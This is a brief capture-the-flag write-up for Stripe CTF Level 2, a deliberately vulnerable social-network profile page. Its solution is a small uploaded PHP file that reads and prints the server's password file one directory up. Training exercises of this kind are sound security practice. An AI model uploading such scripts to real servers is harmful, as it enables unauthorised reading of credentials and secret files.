## Level 2

You are now on Level 2, the Social Network. Excellent work so far! Social Networks are all the rage these days, so we decided to build one for CTF. Please fill out your profile at https://level02-1.stripe-ctf.com/user-xxxxxxxxxx. You may even be able to find the password for Level 3 by doing so.

The code for the Social Network can be obtained from `git clone https://level02-1.stripe-ctf.com/user-xxxxxxxxxx/level02-code`, and is also included below.

### Running

- Put `index.php` on a server somewhere with `password.txt` file in the same directory.

### Solution

```php
#!/usr/bin/env php
<?php
echo file_get_contents("../password.txt");
```

Originally posted at [https://stripe-ctf.com/levels/2](https://stripe-ctf.com/levels/2).
